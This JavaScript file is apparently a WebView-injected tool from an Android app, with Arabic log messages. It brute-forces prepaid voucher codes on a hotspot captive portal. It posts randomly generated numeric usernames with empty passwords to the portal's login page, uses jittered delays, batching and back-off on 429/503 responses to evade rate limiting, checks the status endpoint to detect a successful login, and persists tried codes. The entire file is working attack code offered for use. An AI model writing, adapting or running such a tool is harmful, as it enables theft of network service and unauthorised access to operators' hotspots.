(function() {
    try { if (window.stopFinder) window.stopFinder(); } catch(e) {}
    const CFG = window.FINDER_CONFIG;
    if (!CFG) { return; }
    let stopped = false;
    window.stopFinder = function() { stopped = true; };

    function log(m) { try { window.AndroidBridge.log(m); } catch(e) {} }
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    function updatePageInput(v) {
        try {
            var inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[name="username"], input[id*="username"]');
            for (var i = 0; i < inputs.length; i++) {
                var inp = inputs[i];
                if (inp.id !== 'urlBar' && inp.name !== 'urlBar') {
                    inp.value = v;
                    inp.dispatchEvent(new Event('input', {bubbles:true}));
                    inp.dispatchEvent(new Event('change', {bubbles:true}));
                    break;
                }
            }
        } catch(e) {}
    }

    async function safeJson(url) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        try {
            const r = await fetch(url, { credentials: 'include', cache: 'no-cache', signal: controller.signal });
            clearTimeout(timeoutId);
            const t = await r.text();
            try { return JSON.parse(t); } catch(e) {
                const s = t.indexOf('{'), e2 = t.lastIndexOf('}');
                if (s !== -1 && e2 > s) { try { return JSON.parse(t.substring(s, e2+1)); } catch(_) {} }
                return null;
            }
        } catch(e) { clearTimeout(timeoutId); return null; }
    }

    function isActive(st) {
        if (!st) return false;
        const li = String(st.logged_in || '').toLowerCase();
        if (!['yes','true','1','on'].includes(li)) return false;
        const u = String(st.username || '').trim();
        const ip = String(st.ip || '').trim();
        const up = String(st.uptime || '').trim();
        return (u && u !== '-' && u !== 'N/A') || (ip && ip !== '-' && up && up !== '-');
    }
    function statusUser(st) {
        if (!st) return null;
        const u = String(st.username || '').trim();
        return (u && u !== '-' && u !== 'N/A' && u !== '---') ? u : null;
    }
    function uptimeSec(s) {
        if (!s) return -1;
        const m = String(s).trim().match(/^(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/);
        if (!m) return -1;
        return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
    }

    async function run() {
        try {
            const base = new URL(CFG.url).origin;
            const statusUrl = base + '/status?var=callBack';
            const loginUrl = base + '/login';

            log('▶ بدء التخمين (مع حفظ التقدم)');
            const tried = new Set(CFG.tried || []);
            log('  تم تجربة ' + tried.size + ' رقم سابقاً في هذه الشبكة');
            
            const init = await safeJson(statusUrl);
            if (init && isActive(init)) {
                const u = statusUser(init);
                if (u) {
                    log('✓ كرت مسجل موجود: ' + u);
                    window.AndroidBridge.found(u, JSON.stringify(init));
                    return;
                }
                log('⚠ جلسة نشطة، username مخفي');
                return;
            }

            let template = { username: '', password: '', dst: base + '/', popup: 'true' };
            try {
                const html = await fetch(CFG.url, { credentials: 'include' }).then(r => r.text());
                const doc = new DOMParser().parseFromString(html, 'text/html');
                const form = doc.querySelector('form');
                if (form) {
                    form.querySelectorAll('input').forEach(i => {
                        const n = i.getAttribute('name');
                        if (n) template[n] = i.getAttribute('value') || '';
                    });
                }
            } catch(e) { }

            const maxVal = Math.pow(10, CFG.digits) - 1;
            if (tried.size > maxVal) {
                log('⚠ تم استنفاد جميع الأرقام الممكنة لهذه الشبكة!');
                return;
            }

            const beforeUp = init ? uptimeSec(init.uptime) : -1;
            const beforeActive = isActive(init);
            
            let done = 0;
            let batchCount = 0;
            
            const MAX_CONCURRENT = CFG.threads || 3;
            const DELAY_MIN = CFG.pause || 300;
            const DELAY_MAX = DELAY_MIN * 4;
            const BATCH_SIZE = CFG.statusEvery || 50;
            const BATCH_REST = 5000;
            const RETRY_DELAY = CFG.retryDelay || 1000;

            function gen() {
                for (let k = 0; k < 1000; k++) {
                    const num = Math.floor(Math.random() * (maxVal + 1));
                    const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;
                    if (!tried.has(v)) { 
                        tried.add(v); 
                        window.AndroidBridge.saveTried(v);
                        return v; 
                    }
                }
                return null;
            }

            async function post(v) {
                const delay = Math.floor(Math.random() * (DELAY_MAX - DELAY_MIN + 1)) + DELAY_MIN;
                await sleep(delay);

                const body = new URLSearchParams();
                for (const k in template) body.set(k, template[k]);
                body.set('username', v);
                body.set('password', '');
                
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 15000);
                
                try {
                    const r = await fetch(loginUrl, {
                        method: 'POST', body: body.toString(),
                        credentials: 'include',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        redirect: 'manual',
                        signal: controller.signal
                    });
                    clearTimeout(timeoutId);
                    
                    let isBad = false;
                    const loc = r.headers.get('Location') || '';
                    let text = '';
                    
                    if (r.status !== 302 && r.status !== 301) {
                        text = await r.text();
                    }
                    
                    // قراءة الرد لمعرفة إذا كان الكرت خاطئ
                    const combined = (loc + ' ' + text).toLowerCase();
                    if (combined.includes('error') || combined.includes('fail') || 
                        combined.includes('invalid') || combined.includes('denied') || 
                        combined.includes('wrong') || combined.includes('incorrect')) {
                        isBad = true;
                    }
                    
                    return { v, code: r.status, isBad };
                } catch(e) {
                    clearTimeout(timeoutId);
                    return { v, code: 0, isBad: true };
                }
            }

            while (done < CFG.attempts && !stopped) {
                if (done > 0 && done % BATCH_SIZE === 0 && batchCount > 0) {
                    log('💤 استراحة ' + (BATCH_REST/1000) + ' ثواني...');
                    await sleep(BATCH_REST);
                    batchCount = 0;
                }

                const batch = [];
                for (let j = 0; j < MAX_CONCURRENT && done < CFG.attempts; j++) {
                    const v = gen();
                    if (!v) break;
                    done++;
                    
                    updatePageInput(v);
                    log('🔍 ' + v);
                    
                    try { window.AndroidBridge.progress(done, CFG.attempts, v); } catch(e){}
                    batch.push(post(v));
                }
                if (batch.length === 0) {
                    log('⚠ لا توجد أرقام جديدة متبقية.');
                    break;
                }
                
                batchCount += batch.length;
                const results = await Promise.all(batch);

                const limited = results.some(r => r.code === 429 || r.code === 503);
                if (limited) {
                    log('🛑 حظر — انتظار ' + (RETRY_DELAY/1000) + ' ثانية...');
                    await sleep(RETRY_DELAY);
                }

                const needCheck = results.some(r => r.code > 0 && r.code !== 429 && r.code !== 503 && !r.isBad);
                if (needCheck) {
                    await sleep(200);
                    const st = await safeJson(statusUrl);
                    const u = statusUser(st);
                    if (u) {
                        log('✅✅✅ كشف عبر status: ' + u);
                        window.AndroidBridge.found(u, JSON.stringify(st));
                        return;
                    }
                    const up = uptimeSec(st && st.uptime);
                    if (st && isActive(st) && !beforeActive && up >= 0 && up <= 15) {
                        const cand = results.find(r => r.code > 0);
                        if (cand) { 
                            log('✅✅✅ جلسة جديدة: ' + cand.v); 
                            window.AndroidBridge.found(cand.v, JSON.stringify(st)); 
                            return; 
                        }
                    }
                }
            }
            log('❌ انتهى — ' + done + ' محاولة جديدة');
        } catch(e) {
            log('❌ خطأ: ' + e.message);
        }
    }

    setTimeout(run, 300);
})();
